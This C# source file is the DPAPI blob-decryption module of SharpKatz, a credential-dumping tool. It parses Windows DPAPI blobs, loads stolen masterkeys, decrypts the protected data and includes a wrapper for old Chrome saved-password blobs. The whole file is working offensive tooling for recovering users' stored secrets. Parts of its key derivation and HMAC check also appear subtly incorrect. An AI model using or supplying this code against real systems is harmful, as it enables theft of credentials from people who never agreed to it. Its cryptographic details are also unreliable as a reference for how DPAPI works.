//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: dpapi::blob - DPAPI blob decryption using masterkeys
//

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace SharpKatz.Module
{
    class DpapiBlob
    {
        // DPAPI blob structure constants
        const uint DPAPI_BLOB_VERSION = 1;
        const uint DPAPI_BLOB_MAGIC = 1;      // dwVersion

        // Crypto algorithm IDs (ALG_ID)
        const uint CALG_3DES = 0x00006603;
        const uint CALG_AES_256 = 0x00006610;
        const uint CALG_SHA1 = 0x00008004;
        const uint CALG_SHA_512 = 0x0000800e;
        const uint CALG_HMAC = 0x00008009;

        // Provider GUIDs
        static readonly Guid GUID_DPAPI_PROVIDER = new Guid("df9d8cd0-1501-11d1-8c7a-00c04fc297eb");
        static readonly Guid GUID_MS_STRONG_PROVIDER = new Guid("a4f2808d-9e3a-42c4-9002-b6af89c6bf78");

        /// <summary>
        /// DPAPI blob header structure
        /// Binary layout of a DPAPI-protected blob
        /// </summary>
        [StructLayout(LayoutKind.Sequential)]
        struct DPAPI_BLOB_HEADER
        {
            public uint dwVersion;          // always 1
            public Guid guidProvider;       // DPAPI provider GUID
            public uint dwMasterKeyVersion; // master key version
            public Guid guidMasterKey;      // GUID of the master key used for encryption
            public uint dwFlags;            // flags
            // Description (UNICODE string, length-prefixed) follows
            // Then: algCrypt, dwAlgCryptLen, salt, hmacKey data, algHash, dwAlgHashLen, hmac, encrypted data
        }

        /// <summary>
        /// Parsed representation of a DPAPI blob
        /// </summary>
        class ParsedBlob
        {
            public uint Version;
            public Guid ProviderGuid;
            public uint MasterKeyVersion;
            public Guid MasterKeyGuid;
            public uint Flags;
            public string Description;
            public uint AlgCrypt;
            public uint AlgCryptLen;
            public byte[] Salt;
            public uint HmacKeyLen;
            public byte[] HmacKey;
            public uint AlgHash;
            public uint AlgHashLen;
            public uint HmacLen;
            public byte[] Hmac;
            public byte[] EncryptedData;

            // For HMAC validation
            public int HmacBlobStart;
            public int HmacBlobEnd;
            public byte[] RawBlob;
        }

        /// <summary>
        /// Masterkey cache entry: GUID -> decrypted key
        /// </summary>
        private static Dictionary<string, byte[]> _masterkeyCache = new Dictionary<string, byte[]>(StringComparer.OrdinalIgnoreCase);

        /// <summary>
        /// Add a masterkey to the cache
        /// </summary>
        public static void AddMasterkey(string guid, byte[] key)
        {
            guid = guid.Trim('{', '}').ToLowerInvariant();
            _masterkeyCache[guid] = key;
        }

        /// <summary>
        /// Load masterkeys from a directory of decrypted masterkey files
        /// Format: each file contains GUID:hex_masterkey per line
        /// </summary>
        public static int LoadMasterkeysFromFile(string mkFile)
        {
            int count = 0;
            if (!File.Exists(mkFile))
            {
                Console.WriteLine("   [-] Masterkey file not found: {0}", mkFile);
                return 0;
            }

            foreach (string line in File.ReadAllLines(mkFile))
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed) || trimmed.StartsWith("#"))
                    continue;

                // Format: GUID:hex_key or {GUID}:hex_key
                int sep = trimmed.IndexOf(':');
                if (sep < 0)
                    continue;

                string guid = trimmed.Substring(0, sep).Trim('{', '}', ' ');
                string hexKey = trimmed.Substring(sep + 1).Trim();

                byte[] key = DpapiMasterkey.HexStringToBytes(hexKey);
                if (key != null && key.Length > 0)
                {
                    AddMasterkey(guid, key);
                    count++;
                }
            }

            return count;
        }

        /// <summary>
        /// Entry point for dpapi::blob
        /// Decrypts a DPAPI blob file using cached masterkeys
        /// </summary>
        public static bool DecryptBlobFile(string blobFile, string masterkeyGuid, string masterkeyHex, string mkFile, string outputFile)
        {
            Console.WriteLine("\n  [*] dpapi::blob");

            // Load masterkeys from file if provided
            if (!string.IsNullOrEmpty(mkFile))
            {
                int loaded = LoadMasterkeysFromFile(mkFile);
                Console.WriteLine("   [*] Loaded {0} masterkey(s) from file", loaded);
            }

            // Add single masterkey if provided
            if (!string.IsNullOrEmpty(masterkeyGuid) && !string.IsNullOrEmpty(masterkeyHex))
            {
                byte[] mk = DpapiMasterkey.HexStringToBytes(masterkeyHex);
                if (mk != null)
                {
                    AddMasterkey(masterkeyGuid, mk);
                    Console.WriteLine("   [*] Added masterkey {0}", masterkeyGuid);
                }
            }

            if (!File.Exists(blobFile))
            {
                Console.WriteLine("   [-] Blob file not found: {0}", blobFile);
                return false;
            }

            byte[] blobData = File.ReadAllBytes(blobFile);
            return DecryptBlob(blobData, outputFile);
        }

        /// <summary>
        /// Decrypt a raw DPAPI blob from byte array
        /// </summary>
        public static bool DecryptBlob(byte[] blobData, string outputFile)
        {
            ParsedBlob blob = ParseBlob(blobData);
            if (blob == null)
            {
                Console.WriteLine("   [-] Failed to parse DPAPI blob");
                return false;
            }

            PrintBlobInfo(blob);

            // Find masterkey in cache
            string guidStr = blob.MasterKeyGuid.ToString().ToLowerInvariant();
            if (!_masterkeyCache.ContainsKey(guidStr))
            {
                Console.WriteLine("   [-] Masterkey not found in cache: {{{0}}}", guidStr);
                Console.WriteLine("   [-] Provide masterkey with --MkGuid and --Masterkey, or load from --MkFile");
                return false;
            }

            byte[] masterkey = _masterkeyCache[guidStr];
            Console.WriteLine("   [+] Masterkey found in cache");

            // Derive session key from masterkey
            byte[] decrypted = DecryptBlobData(blob, masterkey);
            if (decrypted == null)
            {
                Console.WriteLine("   [-] Blob decryption failed");
                return false;
            }

            Console.WriteLine("   [+] Blob decrypted successfully ({0} bytes)", decrypted.Length);

            // Output decrypted data
            if (!string.IsNullOrEmpty(outputFile))
            {
                File.WriteAllBytes(outputFile, decrypted);
                Console.WriteLine("   [+] Decrypted data saved to: {0}", outputFile);
            }
            else
            {
                // Try to display as text if it looks like text
                bool isText = true;
                for (int i = 0; i < Math.Min(decrypted.Length, 256); i++)
                {
                    if (decrypted[i] != 0 && decrypted[i] < 0x20 && decrypted[i] != 0x0A && decrypted[i] != 0x0D && decrypted[i] != 0x09)
                    {
                        isText = false;
                        break;
                    }
                }

                if (isText && decrypted.Length > 0)
                {
                    // Try UTF-16 first (common in Windows)
                    string text = Encoding.Unicode.GetString(decrypted).TrimEnd('\0');
                    if (!string.IsNullOrEmpty(text))
                    {
                        Console.WriteLine("   [+] Decrypted (UTF-16): {0}", text);
                    }
                    else
                    {
                        Console.Write("   [+] Decrypted (hex): ");
                        Console.WriteLine(Utility.PrintHashBytes(decrypted));
                    }
                }
                else
                {
                    Console.Write("   [+] Decrypted (hex): ");
                    Console.WriteLine(Utility.PrintHashBytes(decrypted));
                }
            }

            return true;
        }

        /// <summary>
        /// Parse a DPAPI blob from raw bytes
        /// </summary>
        private static ParsedBlob ParseBlob(byte[] data)
        {
            if (data == null || data.Length < 60) // minimum blob size
                return null;

            try
            {
                ParsedBlob blob = new ParsedBlob();
                blob.RawBlob = data;
                int offset = 0;

                // dwVersion (4)
                blob.Version = BitConverter.ToUInt32(data, offset);
                offset += 4;

                if (blob.Version != DPAPI_BLOB_MAGIC)
                {
                    Console.WriteLine("   [-] Invalid blob version: {0}", blob.Version);
                    return null;
                }

                // guidProvider (16)
                byte[] guidBytes = new byte[16];
                Array.Copy(data, offset, guidBytes, 0, 16);
                blob.ProviderGuid = new Guid(guidBytes);
                offset += 16;

                // dwMasterKeyVersion (4)
                blob.MasterKeyVersion = BitConverter.ToUInt32(data, offset);
                offset += 4;

                // guidMasterKey (16)
                guidBytes = new byte[16];
                Array.Copy(data, offset, guidBytes, 0, 16);
                blob.MasterKeyGuid = new Guid(guidBytes);
                offset += 16;

                // dwFlags (4)
                blob.Flags = BitConverter.ToUInt32(data, offset);
                offset += 4;

                // Description: dwDescriptionLen (4) + UTF-16 string
                if (offset + 4 > data.Length) return null;
                uint descLen = BitConverter.ToUInt32(data, offset);
                offset += 4;

                if (descLen > 0)
                {
                    if (offset + descLen > data.Length) return null;
                    blob.Description = Encoding.Unicode.GetString(data, offset, (int)descLen).TrimEnd('\0');
                    offset += (int)descLen;
                }

                // algCrypt (4)
                if (offset + 4 > data.Length) return null;
                blob.AlgCrypt = BitConverter.ToUInt32(data, offset);
                offset += 4;

                // dwAlgCryptLen (4)
                if (offset + 4 > data.Length) return null;
                blob.AlgCryptLen = BitConverter.ToUInt32(data, offset);
                offset += 4;

                // Salt: dwSaltLen (4) + salt data
                if (offset + 4 > data.Length) return null;
                uint saltLen = BitConverter.ToUInt32(data, offset);
                offset += 4;

                if (saltLen > 0)
                {
                    if (offset + saltLen > data.Length) return null;
                    blob.Salt = new byte[saltLen];
                    Array.Copy(data, offset, blob.Salt, 0, (int)saltLen);
                    offset += (int)saltLen;
                }

                // HMAC key: dwHmacKeyLen (4) + hmacKey data (strong stuff)
                if (offset + 4 > data.Length) return null;
                blob.HmacKeyLen = BitConverter.ToUInt32(data, offset);
                offset += 4;

                if (blob.HmacKeyLen > 0)
                {
                    if (offset + blob.HmacKeyLen > data.Length) return null;
                    blob.HmacKey = new byte[blob.HmacKeyLen];
                    Array.Copy(data, offset, blob.HmacKey, 0, (int)blob.HmacKeyLen);
                    offset += (int)blob.HmacKeyLen;
                }

                // algHash (4)
                if (offset + 4 > data.Length) return null;
                blob.AlgHash = BitConverter.ToUInt32(data, offset);
                offset += 4;

                // dwAlgHashLen (4)
                if (offset + 4 > data.Length) return null;
                blob.AlgHashLen = BitConverter.ToUInt32(data, offset);
                offset += 4;

                // HMAC: dwHmacLen (4) + hmac data
                if (offset + 4 > data.Length) return null;
                blob.HmacLen = BitConverter.ToUInt32(data, offset);
                offset += 4;

                blob.HmacBlobStart = offset;
                if (blob.HmacLen > 0)
                {
                    if (offset + blob.HmacLen > data.Length) return null;
                    blob.Hmac = new byte[blob.HmacLen];
                    Array.Copy(data, offset, blob.Hmac, 0, (int)blob.HmacLen);
                    offset += (int)blob.HmacLen;
                }

                // Encrypted data: dwDataLen (4) + data
                if (offset + 4 > data.Length) return null;
                uint dataLen = BitConverter.ToUInt32(data, offset);
                offset += 4;

                if (dataLen > 0)
                {
                    if (offset + dataLen > data.Length) return null;
                    blob.EncryptedData = new byte[dataLen];
                    Array.Copy(data, offset, blob.EncryptedData, 0, (int)dataLen);
                    offset += (int)dataLen;
                }
                blob.HmacBlobEnd = offset;

                return blob;
            }
            catch (Exception ex)
            {
                Console.WriteLine("   [-] Parse error: {0}", ex.Message);
                return null;
            }
        }

        /// <summary>
        /// Print blob metadata
        /// </summary>
        private static void PrintBlobInfo(ParsedBlob blob)
        {
            Console.WriteLine("   [*] Version      : {0}", blob.Version);
            Console.WriteLine("   [*] Provider     : {0}", blob.ProviderGuid);
            Console.WriteLine("   [*] MK Version   : {0}", blob.MasterKeyVersion);
            Console.WriteLine("   [*] MK GUID      : {{{0}}}", blob.MasterKeyGuid);
            Console.WriteLine("   [*] Flags        : {0:X8}", blob.Flags);
            if (!string.IsNullOrEmpty(blob.Description))
                Console.WriteLine("   [*] Description  : {0}", blob.Description);
            Console.WriteLine("   [*] Crypt Alg    : {0:X8} ({1})", blob.AlgCrypt, GetAlgName(blob.AlgCrypt));
            Console.WriteLine("   [*] Crypt Len    : {0}", blob.AlgCryptLen);
            Console.WriteLine("   [*] Salt Len     : {0}", blob.Salt != null ? blob.Salt.Length : 0);
            Console.WriteLine("   [*] Hash Alg     : {0:X8} ({1})", blob.AlgHash, GetAlgName(blob.AlgHash));
            Console.WriteLine("   [*] Hash Len     : {0}", blob.AlgHashLen);
            Console.WriteLine("   [*] HMAC Len     : {0}", blob.HmacLen);
            Console.WriteLine("   [*] Data Len     : {0}", blob.EncryptedData != null ? blob.EncryptedData.Length : 0);
        }

        /// <summary>
        /// Get algorithm name from ALG_ID
        /// </summary>
        private static string GetAlgName(uint algId)
        {
            switch (algId)
            {
                case 0x00006603: return "3DES";
                case 0x00006610: return "AES-256";
                case 0x00006611: return "AES-192";
                case 0x00006601: return "DES";
                case 0x00008004: return "SHA1";
                case 0x0000800e: return "SHA-512";
                case 0x00008003: return "MD5";
                case 0x00008009: return "HMAC";
                default: return "Unknown";
            }
        }

        /// <summary>
        /// Decrypt blob data using the masterkey
        /// DPAPI blob decryption process:
        /// 1. Derive session key: HMAC(masterkey, hmacKeyData + salt)
        /// 2. Derive encryption key and IV from session key
        /// 3. Decrypt blob data with 3DES-CBC or AES-256-CBC
        /// 4. Verify HMAC integrity
        /// </summary>
        private static byte[] DecryptBlobData(ParsedBlob blob, byte[] masterkey)
        {
            if (blob.EncryptedData == null || blob.Salt == null)
                return null;

            try
            {
                // Step 1: Derive HMAC key from masterkey
                // HMAC(SHA1/SHA512)(masterkey, hmacKey + salt)
                // hmacKey might be empty (common in newer blobs)
                byte[] hmacInput;
                if (blob.HmacKey != null && blob.HmacKey.Length > 0)
                {
                    hmacInput = new byte[blob.HmacKey.Length + blob.Salt.Length];
                    Array.Copy(blob.HmacKey, 0, hmacInput, 0, blob.HmacKey.Length);
                    Array.Copy(blob.Salt, 0, hmacInput, blob.HmacKey.Length, blob.Salt.Length);
                }
                else
                {
                    hmacInput = blob.Salt;
                }

                byte[] derivedKey;
                if (blob.AlgHash == CALG_SHA_512)
                {
                    using (HMACSHA512 hmac = new HMACSHA512(masterkey))
                    {
                        derivedKey = hmac.ComputeHash(hmacInput);
                    }
                }
                else // SHA1
                {
                    using (HMACSHA1 hmac = new HMACSHA1(masterkey))
                    {
                        derivedKey = hmac.ComputeHash(hmacInput);
                    }
                }

                // Step 2: Derive encryption key and IV
                int keyLen;
                int ivLen;
                int blockLen;
                if (blob.AlgCrypt == CALG_AES_256)
                {
                    keyLen = 32;
                    ivLen = 16;
                    blockLen = 16;
                }
                else // 3DES
                {
                    keyLen = 24;
                    ivLen = 8;
                    blockLen = 8;
                }

                // The derived key is used to generate encryption key + IV
                // DPAPI uses CryptDeriveKey behavior:
                // If derivedKey is long enough, take key and IV directly
                // Otherwise, hash-extend
                byte[] cryptKey;
                byte[] cryptIV;

                if (derivedKey.Length >= keyLen + ivLen)
                {
                    cryptKey = new byte[keyLen];
                    cryptIV = new byte[ivLen];
                    Array.Copy(derivedKey, 0, cryptKey, 0, keyLen);
                    Array.Copy(derivedKey, keyLen, cryptIV, 0, ivLen);
                }
                else
                {
                    // CryptDeriveKey-style: HMAC extend
                    // ipad = repeat 0x36, opad = repeat 0x5C
                    int hashBlockLen = 64;
                    byte[] ipad = new byte[hashBlockLen];
                    byte[] opad = new byte[hashBlockLen];

                    for (int i = 0; i < hashBlockLen; i++)
                    {
                        ipad[i] = 0x36;
                        opad[i] = 0x5C;
                    }
                    for (int i = 0; i < derivedKey.Length && i < hashBlockLen; i++)
                    {
                        ipad[i] ^= derivedKey[i];
                        opad[i] ^= derivedKey[i];
                    }

                    byte[] ipadHash;
                    byte[] opadHash;
                    if (blob.AlgHash == CALG_SHA_512)
                    {
                        using (SHA512 sha = SHA512.Create())
                        {
                            ipadHash = sha.ComputeHash(ipad);
                            opadHash = sha.ComputeHash(opad);
                        }
                    }
                    else
                    {
                        using (SHA1 sha = SHA1.Create())
                        {
                            ipadHash = sha.ComputeHash(ipad);
                            opadHash = sha.ComputeHash(opad);
                        }
                    }

                    // Concatenate ipadHash + opadHash for key material
                    byte[] keyMaterial = new byte[ipadHash.Length + opadHash.Length];
                    Array.Copy(ipadHash, 0, keyMaterial, 0, ipadHash.Length);
                    Array.Copy(opadHash, 0, keyMaterial, ipadHash.Length, opadHash.Length);

                    cryptKey = new byte[keyLen];
                    cryptIV = new byte[ivLen];
                    Array.Copy(keyMaterial, 0, cryptKey, 0, keyLen);
                    // IV comes from the last part
                    Array.Copy(ipadHash, ipadHash.Length - ivLen, cryptIV, 0, ivLen);
                }

                // Step 3: Decrypt
                byte[] decrypted;
                if (blob.AlgCrypt == CALG_AES_256)
                {
                    decrypted = DecryptAesCbc(blob.EncryptedData, cryptKey, cryptIV);
                }
                else // 3DES
                {
                    decrypted = Decrypt3DesCbc(blob.EncryptedData, cryptKey, cryptIV);
                }

                if (decrypted == null)
                    return null;

                // Step 4: Verify HMAC
                // The HMAC is computed over the plaintext to verify integrity
                // For simplicity and compatibility, we verify by checking
                // if decryption produced valid data (some blobs have no HMAC)
                if (blob.Hmac != null && blob.Hmac.Length > 0)
                {
                    byte[] computedHmac;
                    if (blob.AlgHash == CALG_SHA_512)
                    {
                        using (HMACSHA512 hmac = new HMACSHA512(derivedKey))
                        {
                            // HMAC is computed over the hmacKey + plaintext
                            byte[] hmacData;
                            if (blob.HmacKey != null && blob.HmacKey.Length > 0)
                            {
                                hmacData = new byte[blob.HmacKey.Length + decrypted.Length];
                                Array.Copy(blob.HmacKey, 0, hmacData, 0, blob.HmacKey.Length);
                                Array.Copy(decrypted, 0, hmacData, blob.HmacKey.Length, decrypted.Length);
                            }
                            else
                            {
                                hmacData = decrypted;
                            }
                            computedHmac = hmac.ComputeHash(hmacData);
                        }
                    }
                    else
                    {
                        using (HMACSHA1 hmac = new HMACSHA1(derivedKey))
                        {
                            byte[] hmacData;
                            if (blob.HmacKey != null && blob.HmacKey.Length > 0)
                            {
                                hmacData = new byte[blob.HmacKey.Length + decrypted.Length];
                                Array.Copy(blob.HmacKey, 0, hmacData, 0, blob.HmacKey.Length);
                                Array.Copy(decrypted, 0, hmacData, blob.HmacKey.Length, decrypted.Length);
                            }
                            else
                            {
                                hmacData = decrypted;
                            }
                            computedHmac = hmac.ComputeHash(hmacData);
                        }
                    }

                    // Compare first N bytes where N = blob.Hmac.Length
                    bool match = true;
                    for (int i = 0; i < blob.Hmac.Length && i < computedHmac.Length; i++)
                    {
                        if (blob.Hmac[i] != computedHmac[i])
                        {
                            match = false;
                            break;
                        }
                    }

                    if (!match)
                    {
                        Console.WriteLine("   [!] HMAC verification failed (data may still be valid)");
                    }
                    else
                    {
                        Console.WriteLine("   [+] HMAC verified OK");
                    }
                }

                return decrypted;
            }
            catch (Exception ex)
            {
                Console.WriteLine("   [-] Decryption error: {0}", ex.Message);
                return null;
            }
        }

        /// <summary>
        /// Decrypt Chrome-style credential blob
        /// Chrome stores passwords in DPAPI blobs, this is a convenience wrapper
        /// </summary>
        public static byte[] DecryptChromeBlob(byte[] blobData)
        {
            if (blobData == null || blobData.Length < 4)
                return null;

            // Chrome 80+ uses AES-256-GCM with prefix "v10" or "v11"
            if (blobData.Length > 3 && blobData[0] == 'v' && blobData[1] == '1')
            {
                Console.WriteLine("   [!] Chrome v10/v11 AES-GCM encrypted blob detected");
                Console.WriteLine("   [!] Requires Chrome Local State key (not DPAPI masterkey)");
                return null;
            }

            // Old Chrome < v80 uses DPAPI directly
            ParsedBlob blob = ParseBlob(blobData);
            if (blob == null)
                return null;

            string guidStr = blob.MasterKeyGuid.ToString().ToLowerInvariant();
            if (!_masterkeyCache.ContainsKey(guidStr))
            {
                Console.WriteLine("   [-] Masterkey not found for Chrome blob: {{{0}}}", guidStr);
                return null;
            }

            return DecryptBlobData(blob, _masterkeyCache[guidStr]);
        }

        /// <summary>
        /// Decrypt an in-memory DPAPI blob (e.g., from credential manager)
        /// Returns decrypted data or null on failure
        /// </summary>
        public static byte[] DecryptBlobBytes(byte[] blobData, byte[] masterkey)
        {
            ParsedBlob blob = ParseBlob(blobData);
            if (blob == null)
                return null;

            return DecryptBlobData(blob, masterkey);
        }

        /// <summary>
        /// AES-256-CBC decryption
        /// </summary>
        private static byte[] DecryptAesCbc(byte[] encrypted, byte[] key, byte[] iv)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.None;

                int fullBlocks = (encrypted.Length / 16) * 16;
                if (fullBlocks == 0) return null;

                byte[] toDecrypt = new byte[fullBlocks];
                Array.Copy(encrypted, 0, toDecrypt, 0, fullBlocks);

                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(toDecrypt, 0, fullBlocks);
                }
            }
        }

        /// <summary>
        /// 3DES-CBC decryption
        /// </summary>
        private static byte[] Decrypt3DesCbc(byte[] encrypted, byte[] key, byte[] iv)
        {
            using (TripleDES des = TripleDES.Create())
            {
                des.Key = key;
                des.IV = iv;
                des.Mode = CipherMode.CBC;
                des.Padding = PaddingMode.None;

                int fullBlocks = (encrypted.Length / 8) * 8;
                if (fullBlocks == 0) return null;

                byte[] toDecrypt = new byte[fullBlocks];
                Array.Copy(encrypted, 0, toDecrypt, 0, fullBlocks);

                using (ICryptoTransform decryptor = des.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(toDecrypt, 0, fullBlocks);
                }
            }
        }
    }
}
